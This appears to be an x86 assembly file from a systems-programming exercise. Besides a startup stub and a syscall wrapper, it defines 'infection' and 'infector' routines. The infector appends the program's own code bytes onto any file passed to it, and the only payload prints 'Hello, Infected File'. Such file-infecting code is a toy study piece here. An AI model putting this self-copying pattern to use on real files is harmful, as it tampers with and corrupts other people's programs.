
section .data       ; we define (global) initialized variables in .data section
	str: db "Hello, Infected File",10,0
    handle: dd 0

section .text

global _start
global system_call
global code_start
global code_end
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    mov     eax, 4          ; SYS_WRITE 4       
    mov     ebx, 1          ; STDOUT 1
    mov     ecx, str        ; str: db "Hello, Infected File" ,10,0
    mov     edx, 21         ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    open_file_syscall:
    mov     eax, 5          ; SYS_OPEN 5       
    mov     ebx, [ebp+8]    ; move given argument
    mov     ecx, 1          ; O_WRITEONLY
    or      ecx, 1024       ; O_APPEND 1024
    mov     edx, 0777       ; File Permissions
    int     0x80            ; Transfer control to operating system
    mov     [handle], eax
    write_tofile_syscall:
    mov     eax, 4          ; SYS_WRITE 4       
    mov     ebx, [handle]   ; move file descriptor
    mov     ecx, code_start ; pointer to what I want to write
    mov     edx, code_end   ; num of bytes I want to write
    sub     edx, ecx
    int     0x80            ; Transfer control to operating system
    close_file_syscall:
    mov     eax, 6          ; SYS_CLOSE 6, 
    mov     ebx, [handle]   ; move file descriptor
    int     0x80            ; Transfer control to operating system
    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
code_end: